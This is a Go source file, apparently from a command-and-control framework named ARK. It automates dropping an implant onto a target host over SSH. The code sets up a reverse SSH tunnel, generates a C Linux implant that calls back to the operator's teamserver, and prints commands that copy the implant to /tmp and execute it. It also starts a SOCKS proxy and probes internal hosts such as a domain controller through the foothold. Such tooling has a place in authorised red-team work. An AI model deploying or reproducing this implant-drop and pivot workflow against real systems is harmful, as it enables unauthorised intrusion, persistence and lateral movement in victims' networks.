package preimplant

import (
	"crypto/sha256"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/KKingZero/ARK/pkg/netproxy"
)

// Hooks for tests. Production uses ssh / this-binary / live dial.
var (
	runArgv = func(argv []string) error {
		if len(argv) == 0 {
			return fmt.Errorf("empty argv")
		}
		cmd := exec.Command(argv[0], argv[1:]...)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		return cmd.Run()
	}
	lookARK = func() (string, error) {
		return os.Executable()
	}
	httpsListenUp = func(port int) bool {
		return strings.HasPrefix(probeAddr(net.JoinHostPort("127.0.0.1", strconv.Itoa(port))), "up")
	}
)

// ControlPath is a short OpenSSH ControlMaster socket for target.
func ControlPath(target string) string {
	home, _ := os.UserHomeDir()
	sum := sha256.Sum256([]byte(strings.TrimSpace(target)))
	return filepath.Join(home, ".ark", fmt.Sprintf("in-%x.sock", sum[:6]))
}

// BackgroundTunnelArgs is ssh -f -N with ControlMaster (drop).
func BackgroundTunnelArgs(target string, local, remote int, controlPath string) ([]string, error) {
	target = strings.TrimSpace(target)
	if target == "" || !strings.Contains(target, "@") {
		return nil, fmt.Errorf("usage: ark inbound drop user@HOST")
	}
	if local <= 0 {
		local = 8443
	}
	if remote <= 0 {
		remote = 8443
	}
	if controlPath == "" {
		controlPath = ControlPath(target)
	}
	fwd := fmt.Sprintf("%d:127.0.0.1:%d", remote, local)
	return []string{
		"ssh", "-f", "-N",
		"-o", "ControlMaster=yes",
		"-o", "ControlPath=" + controlPath,
		"-o", "ExitOnForwardFailure=yes",
		"-o", "ServerAliveInterval=30",
		"-R", fwd,
		target,
	}, nil
}

// MasterCheckArgs is ssh -O check against the ControlPath.
func MasterCheckArgs(target, controlPath string) []string {
	return []string{"ssh", "-O", "check", "-o", "ControlPath=" + controlPath, target}
}

// CloseTunnelArgs is ssh -O exit.
func CloseTunnelArgs(target, controlPath string) []string {
	return []string{"ssh", "-O", "exit", "-o", "ControlPath=" + controlPath, target}
}

// GenerateArgs is ark op generate for loopback C Linux (secret registered).
func GenerateArgs(arkBin, callback, outPath string) []string {
	if arkBin == "" {
		arkBin = "ark"
	}
	return []string{
		arkBin, "op", "generate",
		"--os", "linux",
		"--language", "c",
		"--callback", callback,
		"--out", outPath,
	}
}

// SocksStartArgs is ark op socks start.
func SocksStartArgs(arkBin string, port int, session string) []string {
	if arkBin == "" {
		arkBin = "ark"
	}
	if port <= 0 {
		port = 1080
	}
	argv := []string{arkBin, "op", "socks", "start", "--port", strconv.Itoa(port)}
	if session != "" {
		argv = append(argv, "--session", session)
	}
	return argv
}

func inboundDrop(args []string) error {
	f, bare := ParseFlags(args)
	target := first(f, "target", "host")
	if target == "" && len(bare) > 0 {
		target = bare[0]
	}
	local, remote, err := tunnelPorts(f)
	if err != nil {
		return err
	}
	if target == "" || !strings.Contains(target, "@") {
		return fmt.Errorf("usage: ark inbound drop user@HOST")
	}
	if !httpsListenUp(local) {
		return fmt.Errorf("teamserver HTTPS down on 127.0.0.1:%d — start: ark teamserver", local)
	}
	cp := ControlPath(target)
	if err := os.MkdirAll(filepath.Dir(cp), 0o700); err != nil {
		return err
	}
	if runArgv(MasterCheckArgs(target, cp)) != nil {
		argv, err := BackgroundTunnelArgs(target, local, remote, cp)
		if err != nil {
			return err
		}
		fmt.Fprintf(os.Stderr, "inbound drop tunnel: %s\n", strings.Join(argv, " "))
		if err := runArgv(argv); err != nil {
			return fmt.Errorf("inbound tunnel: %w", err)
		}
	} else {
		fmt.Fprintf(os.Stderr, "inbound drop: existing ControlMaster %s\n", cp)
	}
	out := first(f, "out")
	if out == "" {
		home, _ := os.UserHomeDir()
		out = filepath.Join(home, ".ark", "inbound_c_linux")
	}
	bin, err := lookARK()
	if err != nil {
		return fmt.Errorf("ark binary: %w", err)
	}
	cb := fmt.Sprintf("https://127.0.0.1:%d", remote)
	gen := GenerateArgs(bin, cb, out)
	fmt.Fprintf(os.Stderr, "inbound drop generate: %s\n", strings.Join(gen, " "))
	if err := runArgv(gen); err != nil {
		return fmt.Errorf("op generate (secret register): %w — do not use make implant-c-linux", err)
	}
	fmt.Printf("inbound drop ready\n")
	fmt.Printf("  tunnel  %s  127.0.0.1:%d -> operator :%d\n", target, remote, local)
	fmt.Printf("  implant %s  CALLBACK_URL=%s  (secret in teamserver DB)\n", out, cb)
	fmt.Printf("  scp %s %s:/tmp/implant_c_linux\n", out, target)
	fmt.Printf("  ssh %s 'chmod +x /tmp/implant_c_linux && /tmp/implant_c_linux'\n", target)
	fmt.Printf("  then: ark inbound through --probe <DC>:389\n")
	fmt.Printf("  close: ark inbound close %s\n", target)
	return nil
}

func inboundThrough(args []string) error {
	f, _ := ParseFlags(args)
	port := 1080
	if p := first(f, "port"); p != "" {
		n, err := strconv.Atoi(p)
		if err != nil || n <= 0 || n > 65535 {
			return fmt.Errorf("--port must be 1-65535")
		}
		port = n
	}
	bin, err := lookARK()
	if err != nil {
		return fmt.Errorf("ark binary: %w", err)
	}
	argv := SocksStartArgs(bin, port, first(f, "session"))
	fmt.Fprintf(os.Stderr, "inbound through socks: %s\n", strings.Join(argv, " "))
	if err := runArgv(argv); err != nil {
		return fmt.Errorf("socks start: %w", err)
	}
	fmt.Print(EnvExports(port))
	probe := first(f, "probe")
	if probe == "" {
		return nil
	}
	if err := ProbeThrough(port, probe); err != nil {
		return err
	}
	fmt.Fprintf(os.Stderr, "inbound through probe ok %s via socks5://127.0.0.1:%d\n", probe, port)
	return nil
}

func inboundClose(args []string) error {
	f, bare := ParseFlags(args)
	target := first(f, "target", "host")
	if target == "" && len(bare) > 0 {
		target = bare[0]
	}
	if target == "" || !strings.Contains(target, "@") {
		return fmt.Errorf("usage: ark inbound close user@HOST")
	}
	argv := CloseTunnelArgs(target, ControlPath(target))
	fmt.Fprintf(os.Stderr, "inbound close: %s\n", strings.Join(argv, " "))
	if err := runArgv(argv); err != nil {
		return fmt.Errorf("inbound close: %w", err)
	}
	return nil
}

// ProbeThrough dials address via SOCKS5 on 127.0.0.1:port.
func ProbeThrough(port int, address string) error {
	if port <= 0 {
		port = 1080
	}
	if address == "" || !strings.Contains(address, ":") {
		return fmt.Errorf("--probe HOST:PORT required")
	}
	u := fmt.Sprintf("socks5://127.0.0.1:%d", port)
	prev := os.Getenv("ARK_PROXY")
	prevLocal := os.Getenv("ARK_PROXY_LOCAL")
	_ = os.Setenv("ARK_PROXY", u)
	if skip, _, _ := net.SplitHostPort(address); skip == "127.0.0.1" || skip == "localhost" || skip == "::1" {
		_ = os.Setenv("ARK_PROXY_LOCAL", "1")
	}
	defer func() {
		_ = os.Setenv("ARK_PROXY", prev)
		_ = os.Setenv("ARK_PROXY_LOCAL", prevLocal)
	}()
	c, err := netproxy.DialTimeout("tcp", address, 8*time.Second)
	if err != nil {
		return fmt.Errorf("probe %s via %s: %w", address, u, err)
	}
	_ = c.Close()
	return nil
}

func tunnelPorts(f map[string]string) (local, remote int, err error) {
	local, remote = 8443, 8443
	if p := first(f, "local", "local-port"); p != "" {
		n, conv := strconv.Atoi(p)
		if conv != nil || n <= 0 {
			return 0, 0, fmt.Errorf("--local must be a port")
		}
		local = n
	}
	if p := first(f, "remote", "remote-port"); p != "" {
		n, conv := strconv.Atoi(p)
		if conv != nil || n <= 0 {
			return 0, 0, fmt.Errorf("--remote must be a port")
		}
		remote = n
	}
	return local, remote, nil
}
